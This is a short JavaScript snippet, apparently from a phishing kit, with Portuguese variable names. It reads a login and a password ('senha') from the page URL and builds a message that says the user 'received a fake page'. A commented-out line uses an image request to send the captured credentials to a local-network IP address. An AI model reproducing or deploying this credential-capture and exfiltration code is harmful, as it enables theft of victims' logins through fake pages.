var url   = window.location.search.replace("?", "");
var items = url.split("&");
var array = {
	'login' : items[0],
	'senha' : items[1]
}

str = array.login
var busca = "%20"; 
var strbusca = eval('/'+busca+'/g');
str2 = str.replace(strbusca, "_");


retorno = array.senha +'&|&'+ str2 + 'Recebeu_uma_PAGINA_FALSA_aguarde...';

alert(retorno);


//new Image().src = "http://192.168.0.123/?=" + retorno